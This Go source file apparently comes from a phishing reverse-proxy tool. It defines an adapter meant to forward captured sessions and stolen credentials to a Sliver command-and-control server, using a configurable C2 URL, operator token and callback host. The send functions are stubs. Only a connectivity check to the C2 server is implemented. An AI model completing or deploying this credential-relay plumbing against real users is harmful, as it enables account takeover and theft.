package c2

import (
	"context"
	"fmt"
	"net/http"
	"time"

	"github.com/phantom-proxy/phantom-proxy/internal/database"
)

// SliverAdapter integrates with Sliver C2 via gRPC/REST
type SliverAdapter struct {
	config     *SliverConfig
	httpClient *http.Client
}

// SliverConfig configuration
type SliverConfig struct {
	Enabled    bool   `yaml:"enabled" mapstructure:"enabled"`
	ServerURL  string `yaml:"server_url" mapstructure:"server_url"`   // e.g. https://c2.example.com
	OperatorToken string `yaml:"operator_token" mapstructure:"operator_token"`
	CallbackHost string `yaml:"callback_host" mapstructure:"callback_host"`
}

// NewSliverAdapter creates Sliver adapter
func NewSliverAdapter(cfg *SliverConfig) *SliverAdapter {
	return &SliverAdapter{
		config: cfg,
		httpClient: &http.Client{
			Timeout: 30 * time.Second,
		},
	}
}

// Name returns adapter name
func (a *SliverAdapter) Name() string { return "sliver" }

// IsAvailable checks Sliver server connectivity
func (a *SliverAdapter) IsAvailable(ctx context.Context) bool {
	if !a.config.Enabled || a.config.ServerURL == "" {
		return false
	}
	req, _ := http.NewRequestWithContext(ctx, "GET", a.config.ServerURL+"/api/version", nil)
	if a.config.OperatorToken != "" {
		req.Header.Set("Authorization", "Bearer "+a.config.OperatorToken)
	}
	resp, err := a.httpClient.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 200
}

// SendSession sends captured session to Sliver
func (a *SliverAdapter) SendSession(ctx context.Context, data *SessionData) error {
	if !a.config.Enabled {
		return nil
	}
	// Sliver REST API: POST sessions/import or custom endpoint
	// В production: использовать Sliver gRPC client
	_ = data
	return fmt.Errorf("sliver: use Sliver gRPC client for full integration - configure implant callback to %s", a.config.CallbackHost)
}

// SendCredentials sends credentials to Sliver loot
func (a *SliverAdapter) SendCredentials(ctx context.Context, creds *database.Credentials, metadata map[string]string) error {
	if !a.config.Enabled {
		return nil
	}
	_ = creds
	_ = metadata
	// Sliver loot API: add credential to loot store
	return nil
}

// HealthCheck verifies Sliver connection
func (a *SliverAdapter) HealthCheck(ctx context.Context) error {
	if !a.IsAvailable(ctx) {
		return fmt.Errorf("sliver server not available")
	}
	return nil
}
